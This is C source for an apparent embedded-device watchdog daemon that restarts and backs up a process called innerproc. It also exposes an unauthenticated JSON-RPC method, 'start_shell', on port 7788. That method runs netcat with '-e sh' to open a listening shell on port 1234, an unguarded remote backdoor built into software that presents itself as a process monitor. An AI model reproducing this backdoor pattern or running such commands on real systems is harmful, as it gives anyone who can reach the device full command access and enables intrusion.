/*
 * innerproc.c
 *
 *  Created on: 2016.11.14
 *      Author: ZTF
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>
#include <sys/file.h>
#include <pthread.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <linux/watchdog.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <linux/ethtool.h>
#include <limits.h>
#include <fcntl.h>

#include "innerproc.h"
#include "jsonrpc-c.h"
#include "iniparser.h"

struct jrpc_server my_out_server;

#ifdef ANDROID/*all android file move to /data/user for more space 2018.06.09*/
#define PREFIX "/data/user"
#else
#define PREFIX "/etc"
#endif

#define PID_PATH PREFIX"/serverpid"
#define PID_PATH_BK PREFIX"/serverpid.bk"

#ifdef MAICHONG
#define INN_PATH "/system/xbin/innerproc.mc"
#define BK_INN_PATH "/system/xbin/innerproc.mc.bk"
#elif defined YANGCHUANG
#define INN_PATH "/system/xbin/innerproc.yc"
#define BK_INN_PATH "/system/xbin/innerproc.yc.bk"
#else
#define INN_PATH "/home/root/innerproc"
#define BK_INN_PATH "/home/root/innerproc.bk"
#endif
static void create_worker(void *(*func)(), void *arg);

static void create_worker(void *(*func)(), void *arg) {
        pthread_t       thread;
        pthread_attr_t  attr;
        int             ret;

        pthread_attr_init(&attr);

        if ((ret = pthread_create(&thread, &attr, func, arg)) != 0) {
                fprintf(stderr, "Can't create thread: %s\n",
                strerror(ret));
                return;
        }
}

int send_cmd_to_local(char * serveraddr,char * cmd)
{
        int    sockfd, n;
        char    recvline[4096], sendline[4096];
        struct sockaddr_in    servaddr;
        //char *cmd="{\"method\":\"opendoor_permit\"}\0";

        if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                DEBUG_ERR_LOG("create socket error: %s(errno: %d)", strerror(errno),errno);
                return 0;
        }

        DEBUG_INFO("cmd:%s",cmd);

        memset(&servaddr, 0, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(6789);
        if( inet_pton(AF_INET, serveraddr, &servaddr.sin_addr) <= 0){
                DEBUG_ERR_LOG("inet_pton error for %s",serveraddr);
		goto err;
        }

        struct timeval timeout={30,0};//3s


        if( connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0){

		return 0;
        }

        setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,(const char*)&timeout,sizeof(timeout));
        if( send(sockfd, cmd, strlen(cmd), 0) < 0)
        {
                DEBUG_ERR_LOG("send msg error: %s(errno: %d)", strerror(errno), errno);
		goto err;
        }
        DEBUG_INFO("sockfd:%d %s",sockfd,cmd);
        setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,(const char*)&timeout,sizeof(timeout));
        int ret = recv(sockfd,recvline,sizeof(recvline),0);
        if(ret <= 0) {
		goto err;
        }
        close(sockfd);
        return 1;
err:
	close(sockfd);
	return 0;
}


int is_running()
{
        //int pidfile = open(PID_PATH,O_RDONLY||O_TRUNC,0600);
        int pidfile = open(PID_PATH,O_RDONLY,0600);
        if(pidfile < 0){

                return -1;
        }
	char pid[32] = {0};
	int ret = read(pidfile,pid,32);
	close(pidfile);

        pidfile = open(PID_PATH,O_RDONLY||O_TRUNC,0600);
	struct flock fl;
        fl.l_whence = SEEK_CUR;
        fl.l_start = 0;
        fl.l_len = 0;
        fl.l_type = F_WRLCK;
        if(fcntl(pidfile,F_SETLK,&fl) < 0){
        //if(lockf(pidfile,F_TLOCK,0) < 0) {
        //if(flock(pidfile,LOCK_EX|LOCK_NB) < 0) {
		close(pidfile);
		return atoi(pid);
        }
	close(pidfile);

	return -1;

}

cJSON * start_shell(jrpc_context * ctx, cJSON * params, cJSON *id) {
#ifdef ANDROID
//	system("busybox pkill -9 nc");
#ifdef YANGCHUANG
	system("busybox nc -l -p 1234 -e /system/bin/sh &");
#else
	system("/system/xbin/busybox nc -l -p 1234 -e sh &");
#endif
	return cJSON_CreateString("shell started connect to port 1234");
#else
	system("nc -l -p 1234 -e sh &");
#endif
	return NULL;
}

void * dameon_alive() {
	int pid_to_check = 0;
	FILE *fp =  NULL;
	char buf[PATH_MAX];
	char procstr[256];
	char cmdstr[256];
	int truecount = 0;
	int falsecount = 0;
	time_t now;
	int pid = 0;
	int bkflag = 0;
	int bksuc = 0;
	while(1) {
		sleep(1);	
		
/*
		if (!(fp=fopen(PID_PATH,"r")))
        	{
        		continue;
        	}

        	pid_to_check = 0;
        	fscanf(fp,"%d",&pid_to_check);
        	fclose(fp);

		bzero(procstr,256);
		snprintf(procstr,256,"/proc/%d/exe",pid_to_check);
		bzero(buf,PATH_MAX);
		readlink(procstr,buf,sizeof(buf)-1);

		if(falsecount > 10) {
			bzero(cmdstr,256);
			snprintf(cmdstr,256,"cp %s %s",BK_INN_PATH,INN_PATH);	
			system(cmdstr);
		}
*/
//		if(strcmp(buf,INN_PATH) != 0) {
		if(falsecount > 10) {
			bzero(cmdstr,256);
			snprintf(cmdstr,256,"cp %s %s",BK_INN_PATH,INN_PATH);	
			system(cmdstr);
		}

		pid = is_running();
		if(pid == -1) {
			//seems innerproc is dead
			//so we must restart it 
			bzero(cmdstr,256);
			snprintf(cmdstr,256,"chmod 544 %s",INN_PATH);
			system(cmdstr);	
			snprintf(cmdstr,256,"%s &",INN_PATH);
			system(cmdstr);	
			truecount = 0;
			falsecount++;
			continue;

		}

		//truecount++;
		falsecount = 0;
		//backup the innerproc
		if((bkflag == 1) && (bksuc == 0)){
			bzero(cmdstr,256);
			snprintf(cmdstr,256,"cp -f %s %s",INN_PATH,BK_INN_PATH);	
			system(cmdstr);
			bksuc = 1;
		
		}
		//truecount = 11;	

		time(&now);		

		if(now % 10 ==0) {
			if(send_cmd_to_local("127.0.0.1","{\"method\":\"show_version\"}") ==0) {
				printf("pid:%d\n",pid);
				if(pid >0)
					kill(pid,9);
				bkflag = 0;
			}
			else
				bkflag = 1;
		}
	}
}


int main(void) {
	
	//signal(SIGPIPE, SIG_IGN);
	//signal(SIGCHLD, SIG_IGN);
	create_worker(dameon_alive,NULL);
	
	jrpc_server_init(&my_out_server, 7788);

	jrpc_register_procedure(&my_out_server, start_shell, "start_shell", NULL );

	jrpc_server_run(&my_out_server);

	jrpc_server_destroy(&my_out_server);
	return 0;
}
